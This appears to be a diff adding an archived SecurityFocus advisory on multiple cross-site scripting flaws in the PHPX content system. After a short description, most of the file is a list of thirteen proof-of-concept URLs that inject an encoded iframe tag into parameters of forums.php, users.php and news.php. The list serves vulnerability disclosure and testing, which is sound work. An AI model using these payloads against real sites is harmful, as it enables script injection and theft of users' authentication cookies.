@@ -1,0 +1,19 @@
+source: http://www.securityfocus.com/bid/10283/info
+
+It has been reported that PHPX is affected by multiple cross-site scripting vulnerabilities. These issues are due to a failure of the application to properly sanitize user-supplied URI input.
+
+These issues could permit a remote attacker to create a malicious URI link that includes hostile HTML and script code. If this link were followed, the hostile code may be rendered in the web browser of the victim user. This would occur in the security context of the affected web site and may allow for theft of cookie-based authentication credentials or other attacks.
+
+http://www.example.com/forums.php?forum_id=[VID]&limit=25%3Ciframe%3E
+http://www.example.com/forums.php?forum_id=[VID]&topic_id=[VID]&limit=15%3Ciframe%3E
+http://www.example.com/users.php?action=&limit=100%3Ciframe%3E
+http://www.example.com/users.php?action=view&user_id=[VID]%3E%3Ciframe%3E
+http://www.example.com/forums.php?action=post&forum_id=[VID]%3E%3Ciframe%3E
+http://www.example.com/forums.php?action=search&search_id=[VID]&limit=25%3E%3Ciframe%3E
+http://www.example.com/users.php?action=email&user_id=%3E%3Ciframe%3E
+http://www.example.com/users.php?action=view&user_id=[VID]%3E%3Ciframe%3E
+http://www.example.com/forums.php?forum_id=[VID]%3E%3Ciframe%3E
+http://www.example.com/forums.php?forum_id=[VID]&topic_id=[VID]&limit=%3E%3Ciframe%3E
+http://www.example.com/forums.php?action=post&forum_id=[VID]&topic_id=[VID]%3E%3Ciframe%3E
+http://www.example.com/news.php?news_id=[VID]%3E%3Ciframe%3E
+http://www.example.com/forums.php?forum_id=[VID]&topic_id=[VID]%3E%3Ciframe%3E
